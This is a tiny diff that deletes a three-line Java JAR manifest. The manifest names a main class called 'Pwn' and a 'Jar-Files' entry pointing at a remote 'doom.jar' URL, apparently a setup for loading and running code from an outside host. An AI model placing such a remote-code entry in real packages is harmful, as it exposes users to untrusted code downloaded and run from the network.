@@ -1,3 +1,0 @@
-Manifest-Version: 1.0
-Main-Class: org.junkyard.Pwn
-Jar-Files: http://eden.planetweb.com/doom.jar
